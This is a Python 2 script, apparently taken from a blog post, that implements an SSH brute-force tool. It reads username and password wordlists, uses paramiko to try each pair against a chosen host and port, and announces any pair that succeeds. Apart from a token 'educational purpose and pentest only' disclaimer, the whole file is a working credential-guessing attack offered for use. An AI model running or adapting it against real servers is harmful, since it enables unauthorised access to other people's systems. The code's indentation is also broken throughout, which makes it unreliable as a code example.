#!/usr/bin/env python    
 
#-*-coding = UTF-8-*-    
#author@:dengyongkai    
#blog@:blog.sina.com.cn/kaiyongdeng    
   
   
import sys    
import os    
import time    
#from threading import Thread    
   
try:    
    from paramiko import SSHClient    
    from paramiko import AutoAddPolicy    
except ImportError:    
    print G+'''''''    
    You need paramiko module.    
   
http://www.lag.net/paramiko/    
   
    Debian/Ubuntu: sudo apt-get install aptitude    
         : sudo aptitude install python-paramiko\n'''+END    
    sys.exit(1)    
   
docs =  """    
            [*] This was written for educational purpose and pentest only. Use it at your own risk.    
            [*] Author will be not responsible for any damage!                                                                   
            [*] Toolname        : ssh_bf.py    
            [*] Author          : xfk    
            [*] Version         : v.0.2    
            [*] Example of use  : python ssh_bf.py [-T target] [-P port] [-U userslist] [-W wordlist] [-H help]    
    """   
   
   
if sys.platform == 'linux' or sys.platform == 'linux2':    
         clearing = 'clear'   
else:       
         clearing = 'cls'   
os.system(clearing)    
   
   
R = "\033[31m";    
G = "\033[32m";    
Y = "\033[33m"   
END = "\033[0m"   
   
   
def logo():    
         print G+"\n                |---------------------------------------------------------------|"   
         print "                |                                                               |"   
         print "                |               blog.sina.com.cn/kaiyongdeng                    |"   
         print "                |                16/05/2012 ssh_bf.py v.0.2                     |"   
         print "                |                  SSH Brute Forcing Tool                       |"   
         print "                |                                                               |"   
         print "                |---------------------------------------------------------------|\n"   
         print " \n                     [-] %s\n" % time.ctime()    
         print docs+END    
   
   
def help():    
    print Y+"       [*]-H       --hostname/ip       <>the target hostname or ip address"   
    print "     [*]-P       --port          <>the ssh service port(default is 22)"   
    print "     [*]-U       --usernamelist      <>usernames list file"   
    print "     [*]-P       --passwordlist      <>passwords list file"   
    print "     [*]-H       --help          <>show help information"   
    print "     [*]Usage:python %s [-T target] [-P port] [-U userslist] [-W wordlist] [-H help]"+END    
    sys.exit(1)    
        
def BruteForce(hostname,port,username,password):    
        '''''''    
        Create SSH connection to target    
        '''   
        ssh = SSHClient()    
        ssh.set_missing_host_key_policy(AutoAddPolicy())    
        try:    
            ssh.connect(hostname, port, username, password, pkey=None, timeout = None, allow_agent=False, look_for_keys=False)    
            status = 'ok'   
            ssh.close()    
        except Exception, e:    
            status = 'error'   
            pass   
    return status    
   
   
def makelist(file):    
    '''''''    
    Make usernames and passwords lists    
    '''   
    items = []    
   
    try:    
        fd = open(file, 'r')    
    except IOError:    
        print R+'unable to read file \'%s\'' % file+END    
        pass   
   
    except Exception, e:    
        print R+'unknown error'+END    
        pass   
   
    for line in fd.readlines():    
        item = line.replace('\n', '').replace('\r', '')    
        items.append(item)    
    fd.close()      
    return items    
   
def main():    
        logo()      
#   print "hello wold"    
        try:        
                for arg in sys.argv:    
                        if arg.lower() == '-t' or arg.lower() == '--target':    
                                hostname = str(sys.argv[int(sys.argv[1:].index(arg))+2])    
                if arg.lower() == '-p' or arg.lower() == '--port':    
                    port = sys.argv[int(sys.argv[1:].index(arg))+2]    
                        elif arg.lower() == '-u' or arg.lower() == '--userlist':    
                                userlist = sys.argv[int(sys.argv[1:].index(arg))+2]    
                        elif arg.lower() == '-w' or arg.lower() == '--wordlist':    
                                wordlist = sys.argv[int(sys.argv[1:].index(arg))+2]    
                        elif arg.lower() == '-h' or arg.lower() == '--help':    
                                help()    
            elif len(sys.argv) <= 1:    
                                help()    
        except:     
                print R+"[-]Cheak your parametars input\n"+END    
                help()    
        print G+"\n[!] BruteForcing target ...\n"+END    
#        print "here is ok"    
#        print hostname,port,wordlist,userlist    
        usernamelist = makelist(userlist)    
        passwordlist = makelist(wordlist)    
   
        print Y+"[*] SSH Brute Force Praparing."   
        print "[*] %s user(s) loaded." % str(len(usernamelist))    
        print "[*] %s password(s) loaded." % str(len(passwordlist))    
        print "[*] Brute Force Is Starting......."+END    
    try:    
            for username in usernamelist:    
                for password in passwordlist:    
                print G+"\n[+]Attempt uaername:%s password:%s..." % (username,password)+END    
                        current = BruteForce(hostname, port, username, password)    
                            if current == 'error':    
                    print R+"[-]O*O The username:%s and password:%s Is Disenbabled...\n" % (username,password)+END    
#                               pass    
                            else:    
                                    print G+"\n[+] ^-^ HaHa,We Got It!!!"   
                                    print "[+] username: %s" % username    
                                    print "[+] password: %s\n" % password+END    
#                                   sys.exit(0)    
    except:    
        print R+"\n[-] There Is Something Wrong,Pleace Cheak It."   
        print "[-] Exitting.....\n"+END    
        raise   
        print Y+"[+] Done.^-^\n"+END    
        sys.exit(0)    
   
   
if __name__ == "__main__":    
    main()